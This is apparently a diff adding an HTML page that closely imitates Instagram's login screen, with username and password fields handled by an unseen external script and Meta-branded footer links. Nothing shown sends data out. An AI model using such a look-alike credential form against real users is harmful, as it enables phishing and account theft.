@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./css/instagram_login.css">
+</head>
+<body>
+
+<div class="main">
+
+  <!-- LEFT -->
+  <div class="left">
+    <img class="ig-logo" src="elements/icons/instagram-logo-white-background.png">
+
+    <h1 class="headline">
+      See everyday moments from your<br>
+      <span class="gradient-text">close friends.</span>
+    </h1>
+
+    <img class="phones-img" src="./elements/media/login-page/ig_phones.png" alt="phones">
+  </div>
+
+  <!-- RIGHT -->
+  <div class="right">
+    <p class="form-title">Log into Instagram</p>
+
+    
+    <div id="error-box" class="error-box" style="display:none">
+      <svg class="error-icon" viewBox="0 0 24 24" fill="none" stroke="#ed4956" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:24px; height:24px; flex-shrink:0;">
+        <circle cx="12" cy="12" r="10"></circle>
+        <line x1="12" y1="8" x2="12" y2="12"></line>
+        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+      </svg>
+      <span> <a href="#!">Find your account and log in.</a></span>
+    </div>
+
+    <input class="form-input" id="username" type="text" placeholder="Mobile number, username or email">
+    <input class="form-input" id="password" type="password" placeholder="Password">
+
+    <button class="btn-login" onclick="handleLogin()">Log in</button>
+
+    <p class="forgot">Forgot password?</p>
+
+    <div class="divider"></div>
+
+    <button class="btn-facebook">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#1877f2">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+      </svg>
+      Log in with Facebook
+    </button>
+
+    <button class="btn-create">Create new account</button>
+
+    <img class="meta-logo" src="elements/icons/meta.png" alt="Meta">
+  </div>
+
+</div>
+
+<footer>
+  <div class="footer-links">
+    <a href="#!">Meta</a><a href="#!">About</a><a href="#!">Blog</a><a href="#!">Jobs</a>
+    <a href="#!">Help</a><a href="#!">API</a><a href="#!">Privacy</a><a href="#!">Terms</a>
+    <a href="#!">Locations</a><a href="#!">Popular</a><a href="#!">Instagram Lite</a>
+    <a href="#!">Meta AI</a><a href="#!">Threads</a>
+    <a href="#!">Contact Uploading &amp; Non-Users</a>
+    <a href="#!">Meta Verified</a><a href="#!">Settlement Agreements</a>
+  </div>
+  <p class="footer-bottom">English ∨ &nbsp;&nbsp; © 2026 Instagram from Meta</p>
+</footer>
+
+<script src="javascript/login-page.js"></script>
+
+</body>
+</html>
